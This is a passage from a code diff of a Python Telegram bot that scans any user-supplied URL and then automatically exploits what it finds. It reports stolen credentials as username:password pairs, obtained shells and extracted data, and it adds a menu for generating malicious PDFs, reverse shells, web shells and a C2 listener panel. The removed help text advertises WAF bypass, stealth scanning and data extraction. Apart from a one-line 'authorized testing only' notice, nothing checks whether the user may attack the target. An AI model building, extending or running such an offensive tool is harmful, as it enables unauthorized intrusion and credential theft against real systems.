+            f"Progress: ░░░░░░░░░░ 0%",
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+        try:
+            # Initialize scanner
+            scanner = ComprehensiveScanner(target_url)
+
+            # Progress tracking
+            progress_steps = [
+                ("Checking target accessibility...", 10),
+                ("Scanning ports and services...", 20),
+                ("Analyzing web vulnerabilities...", 40),
+                ("Testing SQL injection...", 50),
+                ("Testing XSS vulnerabilities...", 60),
+                ("Testing IDOR vulnerabilities...", 70),
+                ("Checking SSL/TLS security...", 80),
+                ("Analyzing DNS configuration...", 90),
+                ("Generating report...", 95),
+                ("Scan completed!", 100)
+            ]
+
+            for step_name, progress in progress_steps:
+                if user_id not in self.active_scans:
+                    await progress_message.edit_text("❌ **Scan Cancelled**")
+                    return
+
+                # Update progress
+                progress_bar = "█" * (progress // 10) + "░" * (10 - progress // 10)
+                await progress_message.edit_text(
+                    f"🔍 **Vulnerability Scan In Progress**\n\n"
+                    f"Target: `{target_url}`\n"
+                    f"Status: {step_name}\n"
+                    f"Progress: {progress_bar} {progress}%",
+                    parse_mode=ParseMode.MARKDOWN
+                )
+
+                # Execute scan steps
+                if progress == 10:
+                    if not scanner.check_target_accessibility():
+                        await progress_message.edit_text(
+                            f"❌ **Scan Failed**\n\n"
+                            f"Target `{target_url}` is not accessible.\n"
+                            f"Please check the URL and try again."
+                        )
+                        del self.active_scans[user_id]
+                        return
+
+                elif progress == 20 and config['include_ports']:
+                    scanner.scan_ports()
+
+                elif progress == 40:
+                    scanner.scan_web_vulnerabilities(aggressive=config['aggressive'])
+                    scanner.detect_cms_and_technologies()
+
+                elif progress == 80 and config['include_ssl']:
+                    scanner.scan_ssl_tls()
+
+                elif progress == 90 and config['include_dns']:
+                    scanner.scan_dns_vulnerabilities()
+
+                await asyncio.sleep(0.5)  # Small delay for UI updates
+
+            # Get scan results
+            results = scanner.get_results()
+
+            # Store results for attack details
+            self.last_scan_results[user_id] = results
+
+            # Generate summary
+            summary = self.generate_scan_summary(results)
+
+            await progress_message.edit_text(summary, parse_mode=ParseMode.MARKDOWN)
+
+            # Auto-remediation if enabled
+            if config['auto_fix'] and results['vulnerabilities']:
+                await self.run_auto_remediation(update, context, results, config)
+
+            # Interactive attacks if enabled
+            if config['attack_mode'] and results['vulnerabilities'] and AttackEngine:
+                await self.run_interactive_attacks(update, context, results, config)
+
+            # VPS/VDS attacks if enabled
+            if config['vps_attack'] and hasattr(scanner, 'run_vps_vds_attacks'):
+                await self.run_vps_attacks(update, context, scanner, config)
+
+            # Generate and send reports
+            await self.send_reports(update, context, results)
+
+        except Exception as e:
+            await progress_message.edit_text(
+                f"❌ **Scan Error**\n\n"
+                f"An error occurred during scanning:\n"
+                f"`{str(e)}`\n\n"
+                f"Please try again with a different target.",
+                parse_mode=ParseMode.MARKDOWN
+            )
+        finally:
+            if user_id in self.active_scans:
+                del self.active_scans[user_id]
+            if user_id in self.user_sessions:
+                del self.user_sessions[user_id]
+
+    async def run_auto_remediation(self, update: Update, context: ContextTypes.DEFAULT_TYPE, results: Dict, config: Dict):
+        """Run auto-remediation on found vulnerabilities"""
+        remediation_message = await update.message.reply_text(
+            "🔧 **Starting Auto-Remediation**\n\nAnalyzing vulnerabilities for automatic fixes..."
+        )
+
+        try:
+            auto_remediation = AutoRemediation(results['target_url'], results['vulnerabilities'])
+            severity_filter = ['Critical', 'High', 'Medium']
+            fix_results = auto_remediation.auto_fix_by_severity(severity_filter)
+
+            fix_summary = f"""
+🔧 **Auto-Remediation Results**
+
+✅ **Attempted:** {fix_results['total_attempted']}
+✅ **Successful:** {fix_results['successful_fixes']}
+❌ **Failed:** {fix_results['failed_fixes']}
+📊 **Success Rate:** {(fix_results['successful_fixes'] / max(fix_results['total_attempted'], 1)) * 100:.1f}%
+
+**Top Fixes Applied:**
 """
-            for achievement in user_stats.get('achievements', []):
-                achievements_text += f"🏅 {achievement.get('description', 'Achievement unlocked')}\n"
+
+            for i, fix in enumerate(fix_results['fix_details'][:3], 1):
+                status_icon = "✅" if fix['success'] else "❌"
+                fix_summary += f"{i}. {status_icon} {fix['vulnerability_type']}\n"
+
+            await remediation_message.edit_text(fix_summary)
+
+        except Exception as e:
+            await remediation_message.edit_text(f"❌ Auto-remediation failed: {str(e)}")
+
+    async def run_interactive_attacks(self, update: Update, context: ContextTypes.DEFAULT_TYPE, results: Dict, config: Dict):
+        """Run interactive attacks on vulnerabilities"""
+        attack_message = await update.message.reply_text(
+            "⚔️ **Starting Smart Exploit Engine**\n\nAnalyzing and exploiting vulnerabilities..."
+        )
+
+        try:
+            # Use smart exploit engine instead
+            from smart_exploit_engine import SmartExploitEngine
             
-            if not user_stats.get('achievements'):
-                achievements_text += "No achievements yet. Start scanning to earn badges!"
-                
-        elif data == 'achievements_stats':
-            achievements_text = f"""
-📊 **Your Statistics**
+            smart_engine = SmartExploitEngine(results['target_url'], results['vulnerabilities'])
+            attack_results = smart_engine.exploit_vulnerabilities()
 
-🎯 **Level:** {user_stats.get('level', 1)}
-⚡ **Experience:** {user_stats.get('experience', 0)} XP
-🔍 **Scans:** {user_stats.get('scans_performed', 0)}
-⚔️ **Attacks:** {user_stats.get('attacks_executed', 0)}
-🏆 **Achievements:** {len(user_stats.get('achievements', []))}
+            # Store attack results for detailed view
+            self.attack_engine_results = attack_results
 
-**Progress to Next Level:**
-{(user_stats.get('level', 1) * 100) - user_stats.get('experience', 0)} XP remaining
+            attack_summary = f"""
+⚔️ **Attack Execution Results**
+
+🎯 **Total Attacks:** {attack_results.get('total_attacks', 0)}
+✅ **Successful:** {attack_results.get('successful_exploits', 0)}
+❌ **Failed:** {attack_results.get('failed_exploits', 0)}
+📊 **Success Rate:** {(attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100:.1f}%
+
+**Data Extracted:** {len(attack_results.get('extracted_data', []))}
+**Credentials Found:** {len(attack_results.get('credentials_found', []))}
+**Shells Obtained:** {len(attack_results.get('shells_obtained', []))}
 """
+
+            if attack_results.get('credentials_found'):
+                attack_summary += "\n🔑 **Credentials Discovered:**\n"
+                for cred in attack_results['credentials_found'][:3]:
+                    attack_summary += f"• {cred.get('data', 'N/A')}\n"
+
+            await attack_message.edit_text(attack_summary)
+        
+        except Exception as e:
+            await attack_message.edit_text(f"❌ Interactive attacks failed: {str(e)}")
+
+    async def run_vps_attacks(self, update: Update, context: ContextTypes.DEFAULT_TYPE, scanner: ComprehensiveScanner, config: Dict):
+        """Run VPS/VDS attacks"""
+        vps_message = await update.message.reply_text(
+            "🚀 **Starting VPS/VDS Attacks**\n\nExecuting server-level attacks..."
+        )
+
+        try:
+            vps_results = scanner.run_vps_vds_attacks()
+
+            if vps_results:
+                # Store VPS results for detailed view
+                self.vps_exploit_results = vps_results
+
+                vps_summary = f"""
+🚀 **VPS/VDS Attack Results**
+
+🎯 **Total Attacks:** {vps_results.get('total_attacks', 0)}
+✅ **Successful:** {vps_results.get('successful_attacks', 0)}
+🔑 **Credentials Found:** {len(vps_results.get('credentials_found', []))}
+🐚 **Shells Obtained:** {len(vps_results.get('shells_obtained', []))}
+"""
+
+                if vps_results.get('credentials_found'):
+                    vps_summary += "\n🔑 **Credentials Discovered:**\n"
+                    for cred in vps_results['credentials_found'][:3]:
+                        vps_summary += f"• {cred.get('service', 'Unknown')}: {cred.get('username', '')}:{cred.get('password', '')}\n"
+
+                await vps_message.edit_text(vps_summary)
+            else:
+                await vps_message.edit_text("ℹ️ No VPS/VDS vulnerabilities found or applicable.")
+
+        except Exception as e:
+            await vps_message.edit_text(f"❌ VPS/VDS attacks failed: {str(e)}")
+
+    def generate_scan_summary(self, results: Dict) -> str:
+        """Generate a summary of scan results"""
+        total_vulns = len(results['vulnerabilities'])
+        critical_count = len([v for v in results['vulnerabilities'] if v['severity'] == 'Critical'])
+        high_count = len([v for v in results['vulnerabilities'] if v['severity'] == 'High'])
+        medium_count = len([v for v in results['vulnerabilities'] if v['severity'] == 'Medium'])
+        low_count = len([v for v in results['vulnerabilities'] if v['severity'] == 'Low'])
+
+        summary = f"""
+✅ **Vulnerability Scan Complete**
+
+🎯 **Target:** `{results['target_url']}`
+📊 **Total Issues Found:** {total_vulns}
+
+**Severity Breakdown:**
+🔴 Critical: {critical_count}
+🟠 High: {high_count}
+🟡 Medium: {medium_count}
+🟢 Low: {low_count}
+
+**Infrastructure:**
+"""
+
+        if results.get('target_ip'):
+            summary += f"📍 **IP:** `{results['target_ip']}`\n"
+
+        if results.get('open_ports'):
+            summary += f"🔌 **Open Ports:** {', '.join(map(str, results['open_ports']))}\n"
+
+        if results.get('services'):
+            summary += "🛠️ **Services:**\n"
+            for port, service in list(results['services'].items())[:3]:
+                summary += f"  • Port {port}: {service}\n"
+
+        if total_vulns > 0:
+            summary += "\n**Top Vulnerabilities:**\n"
+            for i, vuln in enumerate(results['vulnerabilities'][:5], 1):
+                severity_emoji = {'Critical': '🔴', 'High': '🟠', 'Medium': '🟡', 'Low': '🟢'}.get(vuln['severity'], '⚪')
+                summary += f"{i}. {severity_emoji} {vuln['type']}\n"
         else:
-            achievements_text = "🏆 Achievement system feature activated!"
-            
-        await query.edit_message_text(achievements_text, parse_mode=ParseMode.MARKDOWN)
+            summary += "\n🎉 **No vulnerabilities detected!**"
 
-    async def _handle_ctf_callbacks(self, query, data):
-        """Handle CTF training callbacks"""
-        responses = {
-            'ctf_web': "🎯 **Web Challenges** loaded!\n\nAvailable challenges:\n• SQL Injection Training\n• XSS Detection Lab\n• Authentication Bypass\n• CSRF Protection Testing",
-            'ctf_crypto': "🔐 **Crypto Challenges** ready!\n\nCryptography puzzles:\n• Hash cracking\n• Cipher analysis\n• Certificate validation\n• Key exchange flaws",
-            'ctf_forensics': "🕵️ **Forensics Challenges** active!\n\nDigital investigation:\n• Log analysis\n• Memory dumps\n• Network packets\n• File recovery",
-            'ctf_binary': "⚔️ **Binary Exploitation** loaded!\n\nLow-level challenges:\n• Buffer overflows\n• ROP chain building\n• Format string bugs\n• Heap exploitation",
-            'ctf_network': "🌐 **Network Security** challenges!\n\nNetwork analysis:\n• Protocol exploitation\n• Traffic analysis\n• Wireless security\n• Firewall bypass",
-            'ctf_osint': "🔍 **OSINT Challenges** ready!\n\nInformation gathering:\n• Social media investigation\n• Domain reconnaissance\n• Metadata analysis\n• Public records search"
-        }
-        
-        await query.edit_message_text(responses.get(data, "🎮 CTF challenge activated!"), parse_mode=ParseMode.MARKDOWN)
+        return summary
 
-    async def _handle_cloud_callbacks(self, query, data):
-        """Handle cloud security callbacks"""
-        responses = {
-            'cloud_aws_audit': "☁️ **AWS Security Audit** initiated!\n\nAuditing AWS resources:\n• IAM policy analysis\n• S3 bucket permissions\n• EC2 security groups\n• Lambda function security",
-            'cloud_azure_audit': "🌐 **Azure Assessment** running!\n\nAzure security review:\n• Resource group analysis\n• Storage account security\n• Network security groups\n• Key vault assessment",
-            'cloud_gcp_audit': "🔍 **GCP Security Scan** active!\n\nGoogle Cloud audit:\n• Project permissions\n• Storage bucket analysis\n• Compute instance security\n• API security review",
-            'cloud_container': "📦 **Container Analysis** executing!\n\nContainer security scan:\n• Image vulnerability assessment\n• Runtime security analysis\n• Configuration review\n• Secrets detection",
-            'cloud_k8s_audit': "⚙️ **Kubernetes Audit** running!\n\nCluster security assessment:\n• RBAC configuration\n• Pod security policies\n• Network policies\n• Secret management",
-            'cloud_s3_hunter': "🗄️ **S3 Bucket Hunter** scanning!\n\nOpen bucket discovery:\n• Public bucket enumeration\n• Permission analysis\n• Data exposure assessment\n• Access logging review"
-        }
-        
-        await query.edit_message_text(responses.get(data, "🌐 Cloud security feature activated!"), parse_mode=ParseMode.MARKDOWN)
+    async def send_reports(self, update: Update, context: ContextTypes.DEFAULT_TYPE, results: Dict):
+        """Send detailed reports to user"""
+        try:
+            report_gen = ReportGenerator(results)
 
-    async def _handle_mobile_callbacks(self, query, data):
-        """Handle mobile security callbacks"""
-        responses = {
-            'mobile_apk_deep': "📱 **APK Deep Analysis** started!\n\nAndroid security assessment:\n• Manifest analysis\n• Permission review\n• Code obfuscation check\n• API endpoint discovery",
-            'mobile_ios_audit': "🍎 **iOS Security Audit** running!\n\niOS application analysis:\n• Info.plist review\n• Binary analysis\n• Keychain usage\n• Network communication",
-            'mobile_decompile': "🔓 **App Decompilation** executing!\n\nReverse engineering:\n• Source code extraction\n• Resource analysis\n• String analysis\n• Method signature review",
-            'mobile_static': "🔍 **Static Code Analysis** active!\n\nCode vulnerability scan:\n• Hardcoded secrets\n• Insecure storage\n• Weak cryptography\n• Input validation flaws",
-            'mobile_dynamic': "⚡ **Dynamic Testing** running!\n\nRuntime analysis:\n• API call monitoring\n• Memory analysis\n• Network traffic capture\n• Runtime manipulation",
-            'mobile_crypto': "🔐 **Crypto Analysis** processing!\n\nCryptographic review:\n• Algorithm strength\n• Key management\n• Certificate pinning\n• Random number generation"
-        }
-        
-        await query.edit_message_text(responses.get(data, "📱 Mobile security feature activated!"), parse_mode=ParseMode.MARKDOWN)
+            # Generate JSON report
+            json_report = report_gen.generate_json_report()
+            json_file = io.BytesIO(json_report.encode('utf-8'))
+            json_file.name = f"vulnerability_report_{int(datetime.now().timestamp())}.json"
 
-    async def _handle_remediation_callbacks(self, query, data):
-        """Handle remediation callbacks"""
-        responses = {
-            'remediation_auto': "🔧 **Auto Fix All** initiated!\n\nAutomatically remediating vulnerabilities:\n• Security header implementation\n• Input validation fixes\n• Authentication strengthening\n• Session security improvements",
-            'remediation_selective': "🎯 **Selective Fix** ready!\n\nChoose specific vulnerabilities to remediate:\n• SQL injection fixes\n• XSS output encoding\n• CSRF token implementation\n• Access control improvements",
-            'remediation_recommendations': "📋 **Fix Recommendations** generated!\n\nDetailed remediation guidance:\n• Step-by-step instructions\n• Code examples\n• Best practice implementation\n• Verification procedures",
-            'remediation_verify': "✅ **Verify Fixes** executing!\n\nValidating remediation success:\n• Re-testing vulnerabilities\n• Security control verification\n• Compliance validation\n• Risk assessment update",
-            'remediation_compliance': "📊 **Compliance Check** running!\n\nOWASP/NIST/ISO 27001 mapping:\n• Control implementation status\n• Gap analysis\n• Risk prioritization\n• Compliance reporting",
-            'remediation_hardening': "🛡️ **Security Hardening** applying!\n\nImplementing security best practices:\n• Server configuration\n• Application hardening\n• Network security\n• Access controls"
-        }
-        
-        await query.edit_message_text(responses.get(data, "🛡️ Remediation feature activated!"), parse_mode=ParseMode.MARKDOWN)
+            # Generate HTML report
+            html_report = report_gen.generate_html_report()
+            html_file = io.BytesIO(html_report.encode('utf-8'))
+            html_file.name = f"vulnerability_report_{int(datetime.now().timestamp())}.html"
 
-    async def _handle_reports_callbacks(self, query, data):
-        """Handle reporting callbacks"""
-        responses = {
-            'reports_executive': "📊 **Executive Summary** generating!\n\nHigh-level security overview:\n• Risk assessment summary\n• Business impact analysis\n• Strategic recommendations\n• Budget considerations",
-            'reports_detailed': "📈 **Detailed Report** creating!\n\nTechnical vulnerability analysis:\n• Complete vulnerability list\n• Exploitation techniques\n• Technical remediation steps\n• Supporting evidence",
-            'reports_timeline': "⏱️ **Attack Timeline** visualizing!\n\nInteractive attack progression:\n• Chronological attack steps\n• Success/failure indicators\n• Impact assessment\n• Mitigation points",
-            'reports_heatmap': "🗺️ **Risk Heat Map** generating!\n\nGeographic vulnerability visualization:\n• Risk distribution\n• Asset mapping\n• Threat concentration\n• Priority zones",
-            'reports_compliance': "📋 **Compliance Report** compiling!\n\nRegulatory framework mapping:\n• OWASP Top 10 compliance\n• NIST framework alignment\n• ISO 27001 controls\n• PCI DSS requirements",
-            'reports_email': "📧 **Email Report** preparing!\n\nAutomated report delivery:\n• Scheduled reporting\n• Stakeholder distribution\n• Custom formatting\n• Attachment management"
-        }
-        
-        await query.edit_message_text(responses.get(data, "📊 Reporting feature activated!"), parse_mode=ParseMode.MARKDOWN)
+            # Send files
+            await update.message.reply_document(
+                document=json_file,
+                caption="📄 **JSON Report** - Machine-readable vulnerability data"
+            )
 
-    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Enhanced help command with all features"""
-        help_text = """
-🤖 **Advanced Security Scanner Bot v2.0 - Complete Command Reference**
+            await update.message.reply_document(
+                document=html_file,
+                caption="📄 **HTML Report** - Human-friendly vulnerability report"
+            )
 
-**🔍 Core Scanning Commands:**
-• `/scan <url>` - Comprehensive vulnerability scan with AI assistance
-• `/quickscan <url>` - Fast security overview with smart detection
-• `/deepscan <url>` - Advanced vulnerability analysis with ML patterns
-• `/api_scan <url>` - API endpoint discovery and testing with fuzzing
+        except Exception as e:
+            await update.message.reply_text(f"❌ Failed to generate reports: {str(e)}")
 
-**⚔️ Advanced Attack & Exploitation:**
-• `/attack <url>` - Smart vulnerability exploitation with AI guidance
-• `/attack_chain <url>` - Multi-stage attack chaining with automation
-• `/smart_exploit <url>` - AI-powered exploitation with adaptation
-• `/zeroday_sim <technologies>` - ML-based zero-day simulation
+    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Check scan status"""
+        user_id = update.effective_user.id
 
-**🤖 AI-Powered Commands:**
-• `/ai_payload <type>` - Smart payload generation with adaptation
-• `/ai_correlation <url>` - ML vulnerability pattern analysis
-• `/threat_intel <indicator>` - Real-time threat intelligence lookup
-• `/behavior_analysis <url>` - Advanced behavioral security analysis
+        if user_id in self.active_scans:
+            await update.message.reply_text("🔍 You have an active scan running. Please wait for completion.")
+        else:
+            await update.message.reply_text("ℹ️ No active scans. Use /scan to start a new scan.")
 
-**🔒 Advanced Evasion & Stealth:**
-• `/waf_bypass <url>` - Automated WAF bypass techniques
-• `/stealth_scan <url>` - Traffic obfuscation and evasion
-• `/proxy_chain <url>` - Multi-proxy attack routing
+    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Stop current scan"""
+        user_id = update.effective_user.id
 
-**🌐 Cloud & Infrastructure:**
-• `/cloud_audit <domain>` - Multi-cloud security assessment
-• `/aws_scan <target>` - Amazon Web Services security audit
-• `/azure_scan <target>` - Microsoft Azure security assessment
-• `/k8s_audit <cluster>` - Kubernetes security analysis
+        if user_id in self.active_scans:
+            del self.active_scans[user_id]
+            if user_id in self.user_sessions:
+                del self.user_sessions[user_id]
+            await update.message.reply_text("🛑 Scan stopped successfully.")
+        else:
+            await update.message.reply_text("ℹ️ No active scan to stop.")
 
-**📱 Mobile Security:**
-• `/mobile_scan <apk/ipa>` - Mobile app comprehensive analysis
-• `/apk_analysis <file>` - Android APK deep security audit
-• `/ios_analysis <file>` - iOS application security assessment
+    async def attacks_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Show detailed attack information from last scan"""
+        user_id = update.effective_user.id
 
-**📊 Compliance & Reporting:**
-• `/compliance <url>` - OWASP/NIST/ISO27001 compliance check
-• `/executive_report` - AI-generated executive summary
-• `/timeline_viz` - Interactive attack timeline visualization
-• `/risk_heatmap` - Geographic vulnerability heat mapping
+        # Check if user has recent scan data
+        if not hasattr(self, 'last_scan_results') or user_id not in getattr(self, 'last_scan_results', {}):
+            await update.message.reply_text(
+                "ℹ️ No recent scan data available. Please run /scan first."
+            )
+            return
 
-**🎮 Training & Gamification:**
-• `/ctf_challenge` - Access CTF training challenges
-• `/achievements` - View your security achievements
-• `/leaderboard` - Global security testing rankings
-• `/training_module <topic>` - Interactive security learning
+        results = self.last_scan_results[user_id]
 
-**🛡️ Auto-Remediation:**
-• `/autofix` - Automated vulnerability remediation
-• `/remediation_plan <url>` - Detailed fix recommendations
-• `/security_hardening <url>` - Security best practices implementation
+        # Generate attack details
+        attack_details = self._generate_attack_details(results)
 
-**💾 Database & Data:**
-• `/db_discover <ip>` - Advanced database service discovery
-• `/db_exploit <connection>` - Database security exploitation
-• `/data_extraction` - Automated sensitive data extraction
+        if attack_details:
+            await update.message.reply_text(attack_details, parse_mode=ParseMode.MARKDOWN)
+        else:
+            await update.message.reply_text("ℹ️ No attack data available from the last scan.")
 
-**🔍 OSINT & Intelligence:**
-• `/osint_deep <target>` - Advanced OSINT reconnaissance
-• `/subdomain_takeover <domain>` - Subdomain takeover detection
-• `/cert_transparency <domain>` - Certificate transparency monitoring
-• `/breach_check <email>` - Data breach information lookup
+    async def exploits_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Show successful exploits and extracted data"""
+        user_id = update.effective_user.id
 
-**Example Advanced Usage:**
+        if not hasattr(self, 'last_scan_results') or user_id not in getattr(self, 'last_scan_results', {}):
+            await update.message.reply_text(
+                "ℹ️ No recent scan data available. Please run /scan first."
+            )
+            return
 
-        /attack_chain https://example.com --ai --evasion --zeroday
-        /cloud_audit example.com --aws --azure --gcp
-        /compliance https://example.com --owasp --nist --iso27001
-        /mobile_scan app.apk --static --dynamic --crypto
-        /ai_payload pdf 192.168.1.100 4444 --adaptive --evasion
+        results = self.last_scan_results[user_id]
 
-⚠️ **Legal Notice:** All features are for authorized security testing only!
-🎯 **Pro Tip:** Combine multiple flags for advanced testing scenarios!
+        # Generate exploit details
+        exploit_details = self._generate_exploit_details(results)
+
+        if exploit_details:
+            await update.message.reply_text(exploit_details, parse_mode=ParseMode.MARKDOWN)
+        else:
+            await update.message.reply_text("✅ No successful exploits found - target appears secure!")
+
+    async def credentials_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Show discovered credentials"""
+        user_id = update.effective_user.id
+
+        if not hasattr(self, 'last_scan_results') or user_id not in getattr(self, 'last_scan_results', {}):
+            await update.message.reply_text(
+                "ℹ️ No recent scan data available. Please run /scan first."
+            )
+            return
+
+        results = self.last_scan_results[user_id]
+
+        # Generate credentials report
+        creds_details = self._generate_credentials_report(results)
+
+        if creds_details:
+            await update.message.reply_text(creds_details, parse_mode=ParseMode.MARKDOWN)
+        else:
+            await update.message.reply_text("ℹ️ No credentials discovered during scan.")
+
+    async def payload_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Payload generation command handler"""
+        user_id = update.effective_user.id
+
+        # Initialize payload session
+        if user_id not in self.user_sessions:
+            self.user_sessions[user_id] = {}
+
+        self.user_sessions[user_id]['step'] = 'payload_type'
+
+        keyboard = [
+            [
+                InlineKeyboardButton("🎯 Malicious PDF", callback_data="payload_pdf"),
+                InlineKeyboardButton("💻 PowerShell", callback_data="payload_powershell")
+            ],
+            [
+                InlineKeyboardButton("🐧 Bash/Linux", callback_data="payload_bash"),
+                InlineKeyboardButton("🐍 Python", callback_data="payload_python")
+            ],
+            [
+                InlineKeyboardButton("🌐 Web Shells", callback_data="payload_webshell"),
+                InlineKeyboardButton("🎛️ Listener Panel", callback_data="payload_listener")
+            ]
+        ]
+
+        reply_markup = InlineKeyboardMarkup(keyboard)
+
+        payload_text = """
+💀 **Payload Generator**
+
+⚠️ **WARNING**: For authorized penetration testing only!
+
+Select the type of payload you want to generate:
+
+🎯 **Malicious PDF** - Cross-platform exploitation
+💻 **PowerShell** - Windows reverse shells
+🐧 **Bash/Linux** - Unix/Linux reverse shells
+🐍 **Python** - Cross-platform Python shells
+🌐 **Web Shells** - PHP/ASP backdoors
+🎛️ **Listener Panel** - Web-based C2 panel
+
+Choose your payload type below:
         """
 
-        await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text(payload_text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
 
-class ComplianceChecker:
-    """Compliance checking against security standards"""
-    
-    def check_compliance(self, scan_results: Dict, standards: List[str]) -> Dict[str, Any]:
-        """Check compliance against specified standards"""
-        compliance_results = {}
-        
-        if '--owasp' in standards:
-            compliance_results['owasp_top10'] = self._check_owasp_top10(scan_results)
-        
-        if '--nist' in standards:
-            compliance_results['nist'] = self._check_nist_framework(scan_results)
-            
-        if '--iso27001' in standards:
-            compliance_results['iso27001'] = self._check_iso27001(scan_results)
-        
-        return compliance_results
-    
-    def _check_owasp_top10(self, results: Dict) -> List[Dict]:
-        """Check OWASP Top 10 compliance"""
-        owasp_checks = [
-            {'category': 'A01:2021 Broken Access Control', 'compliant': True},
-            {'category': 'A02:2021 Cryptographic Failures', 'compliant': True},
-            {'category': 'A03:2021 Injection', 'compliant': True},
-            {'category': 'A04:2021 Insecure Design', 'compliant': True},
-            {'category': 'A05:2021 Security Misconfiguration', 'compliant': True},
-            {'category': 'A06:2021 Vulnerable Components', 'compliant': True},
-            {'category': 'A07:2021 Identity/Authentication Failures', 'compliant': True},
-            {'category': 'A08:2021 Software/Data Integrity Failures', 'compliant': True},
-            {'category': 'A09:2021 Security Logging/Monitoring Failures', 'compliant': True},
-            {'category': 'A10:2021 Server-Side Request Forgery', 'compliant': True}
-        ]
-        
-        # Check for SQL injection (A03)
-        sql_vulns = [v for v in results.get('vulnerabilities', []) if 'sql injection' in v.get('type', '').lower()]
-        if sql_vulns:
-            owasp_checks[2]['compliant'] = False
-        
-        # Check for XSS (A03)
-        xss_vulns = [v for v in results.get('vulnerabilities', []) if 'xss' in v.get('type', '').lower()]
-        if xss_vulns:
-            owasp_checks[2]['compliant'] = False
-        
-        # Check security headers (A05)
-        security_headers = results.get('security_headers', [])
-        critical_headers = ['X-Frame-Options', 'Content-Security-Policy', 'X-Content-Type-Options']
-        missing_headers = [h for h in critical_headers if not any(header.get('header') == h and header.get('present') for header in security_headers)]
-        if missing_headers:
-            owasp_checks[4]['compliant'] = False
-        
-        return owasp_checks
-    
-    def _check_nist_framework(self, results: Dict) -> List[Dict]:
-        """Check NIST Cybersecurity Framework compliance"""
-        return [
-            {'control': 'Identify (ID)', 'implemented': True},
-            {'control': 'Protect (PR)', 'implemented': len(results.get('security_headers', [])) > 3},
-            {'control': 'Detect (DE)', 'implemented': True},
-            {'control': 'Respond (RS)', 'implemented': True},
-            {'control': 'Recover (RC)', 'implemented': True}
-        ]
-    
-    def _check_iso27001(self, results: Dict) -> List[Dict]:
-        """Check ISO 27001 compliance"""
-        return [
-            {'control': 'A.13.1.1 Network controls', 'adequate': True},
-            {'control': 'A.14.1.3 Protecting application services', 'adequate': len(results.get('vulnerabilities', [])) < 10},
-            {'control': 'A.12.6.1 Management of technical vulnerabilities', 'adequate': True},
-            {'control': 'A.13.2.1 Information transfer policies', 'adequate': True}
-        ]
+    def _generate_attack_details(self, results: Dict) -> str:
+        """Generate detailed attack information"""
+        if not hasattr(self, 'attack_results'):
+            return ""
+
+        attack_info = f"""
+🔍 **Attack Details Summary**
+
+**Target:** `{results.get('target_url', 'Unknown')}`
+**Target IP:** `{results.get('target_ip', 'Unknown')}`
+
+**Vulnerability-Based Attacks:**
+"""
+
+        # Count attacks by vulnerability type
+        vuln_types = {}
+        for vuln in results.get('vulnerabilities', []):
+            vuln_type = vuln['type']
+            if vuln_type not in vuln_types:
+                vuln_types[vuln_type] = {'count': 0, 'severity': vuln['severity']}
+            vuln_types[vuln_type]['count'] += 1
+
+        if vuln_types:
+            for vuln_type, info in vuln_types.items():
+                severity_emoji = {'Critical': '🔴', 'High': '🟠', 'Medium': '🟡', 'Low': '🟢'}.get(info['severity'], '⚪')
+                attack_info += f"• {severity_emoji} **{vuln_type}**: {info['count']} attack(s)\n"
+
+        # VPS/VDS Attack details
+        if hasattr(self, 'vps_attack_summary'):
+            attack_info += f"\n**VPS/VDS Attacks:**\n{self.vps_attack_summary}"
+
+        # Port-based attacks
+        if results.get('open_ports'):
+            attack_info += f"\n**Port-Based Attacks:**\n"
+            for port in results['open_ports']:
+                service = results.get('services', {}).get(port, 'Unknown')
+                attack_info += f"• Port {port} ({service}): Service enumeration\n"
+
+        return attack_info
+
+    def _generate_exploit_details(self, results: Dict) -> str:
+        """Generate successful exploit information"""
+        exploit_info = f"""
+⚔️ **Successful Exploits Report**
+
+**Target:** `{results.get('target_url', 'Unknown')}`
+"""
+
+        # Check for attack engine results
+        if hasattr(self, 'attack_engine_results'):
+            attack_results = self.attack_engine_results
+
+            exploit_info += f"""
+**Attack Statistics:**
+• Total Attacks: {attack_results.get('total_attacks', 0)}
+• Successful Exploits: {attack_results.get('successful_exploits', 0)}
+• Failed Exploits: {attack_results.get('failed_exploits', 0)}
+• Success Rate: {(attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100:.1f}%
+"""
+
+            # Data extraction results
+            if attack_results.get('extracted_data'):
+                exploit_info += f"\n**📊 Data Extracted:**\n"
+                for i, data in enumerate(attack_results['extracted_data'][:5], 1):
+                    exploit_info += f"{i}. `{data[:50]}{'...' if len(data) > 50 else ''}`\n"
+
+            # Shells obtained
+            if attack_results.get('shells_obtained'):
+                exploit_info += f"\n**🐚 Shells Obtained:**\n"
+                for shell in attack_results['shells_obtained']:
+                    exploit_info += f"• **{shell['type']}**: {shell.get('url', shell.get('status', 'Active'))}\n"
+
+        # VPS/VDS exploit results
+        if hasattr(self, 'vps_exploit_results'):
+            vps_results = self.vps_exploit_results
+            if vps_results.get('successful_attacks', 0) > 0:
+                exploit_info += f"\n**🚀 VPS/VDS Exploits:**\n"
+                exploit_info += f"• Successful Attacks: {vps_results['successful_attacks']}\n"
+
+                if vps_results.get('credentials_found'):
+                    exploit_info += "• Credentials Found:\n"
+                    for cred in vps_results['credentials_found'][:3]:
+                        exploit_info += f"  - {cred.get('service', 'Unknown')}: `{cred.get('username', '')}:{cred.get('password', '')}`\n"
+
+        return exploit_info
+
+    def _generate_credentials_report(self, results: Dict) -> str:
+        """Generate credentials discovery report"""
+        creds_report = f"""
+🔑 **Credentials Discovery Report**
+
+**Target:** `{results.get('target_url', 'Unknown')}`
+"""
+
+        found_credentials = []
+
+        # Attack engine credentials
+        if hasattr(self, 'attack_engine_results') and self.attack_engine_results.get('credentials_found'):
+            for cred in self.attack_engine_results['credentials_found']:
+                found_credentials.append({
+                    'source': 'Web Attack',
+                    'data': cred.get('data', ''),
